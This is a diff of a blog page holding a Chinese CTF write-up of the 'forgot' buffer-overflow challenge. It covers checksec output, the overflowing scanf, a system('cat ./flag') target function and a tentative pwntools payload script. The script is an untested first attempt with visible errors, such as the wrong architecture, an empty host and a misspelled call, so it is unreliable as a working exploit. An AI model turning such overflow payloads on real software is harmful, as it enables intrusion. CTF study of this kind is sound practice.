@@ -246,7 +246,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-15 17:15:46" itemprop="dateModified" datetime="2021-04-15T17:15:46+08:00">2021-04-15</time>
+                <time title="Modified: 2021-04-18 22:24:23" itemprop="dateModified" datetime="2021-04-18T22:24:23+08:00">2021-04-18</time>
               </span>
 
           
@@ -261,19 +261,17 @@
 
       
           <p><code>RELRO:    Partial RELRO</code><br><code>Stack:    No canary found</code><br><code>NX:       NX enabled</code><br><code>PIE:      No PIE (0x8048000)</code></p>
-<p>目前所学所有攻击手法均需要有输入漏洞<br>本题有两个入口<br>第二个入口可产生数据溢出<br><code>char v2[32]; // [esp+10h] [ebp-74h]</code><br><code>__isoc99_scanf(&quot;%s&quot;, v2);</code><br>v2真正大小只有：[esp+10h] [ebp-22h]，即32个字节</p>
+<p>目前所学所有攻击手法均需要有输入漏洞<br>本题有两个入口<br>第二个入口可产生数据溢出<br><code>char v2[32]; // [esp+10h] [ebp-74h]</code><br><code>__isoc99_scanf(&quot;%s&quot;, v2);</code><br>v2真正大小只有：32个字节，即ebp-74到ebp-54</p>
 <p>在从后往前分析一下：</p>
-<ol>
-<li><p>找到一个system函数可用，但没有关键字符串可用，或许可以自己构造</p>
-</li>
-<li><p>又找到一个函数，几乎可以确定为目标函数<br><code>`int sub_80486CC()</code><br><code>&#123;</code><br>  <code>char s; // [esp+1Eh] [ebp-3Ah]</code></p>
-<p>  <code>snprintf(&amp;s, 0x32u, &quot;cat %s&quot;, &quot;./flag&quot;);</code><br>  <code>return system(&amp;s);</code><br>`}``<br>目标函数首地址为：0x080486CC</p>
-</li>
-<li><p>找到一个反编译失败函数，地址：0x8048A61</p>
+<p>找到一个system函数可用，但没有关键字符串可用，或许可以自己构造</p>
+<p>又找到一个函数，几乎可以确定为目标函数<br>int sub_80486CC()<br>{<br>​    char s; // [esp+1Eh] [ebp-3Ah]<br>​    snprintf(&amp;s, 0x32u, “cat %s”, “./flag”);<br>​    return system(&amp;s);<br>}<br>  目标函数首地址为：0x080486CC</p>
+<p>找到一个反编译失败函数，地址：0x8048A61</p>
 <img src="/2021/04/11/AD-forgot/1.png" class>
-<p>call eax是突破口</p>
-</li>
-</ol>
+<p><code>(*(&amp;v3 + --v14))();</code></p>
+<p>取v3函数的地址，对其进行偏移，得到一个新的地址，调用这个函数</p>
+<p>第一想法是用这里直接TM的偏移到目标函数，试一试：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">&quot;a&quot;</span>+p32(<span class="number">-238</span>)+p32(<span class="number">0x80486CC</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interative()</span><br><span class="line"><span class="comment"># 骗分过样例，暴力出奇迹</span></span><br></pre></td></tr></table></figure>
+<p>但是攻防世界网站又炸了，我是它爹</p>
 
       
     </div>
@@ -408,7 +406,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-08 20:24:54" itemprop="dateModified" datetime="2021-04-08T20:24:54+08:00">2021-04-08</time>
+                <time title="Modified: 2021-04-17 23:35:17" itemprop="dateModified" datetime="2021-04-17T23:35:17+08:00">2021-04-17</time>
               </span>
 
           
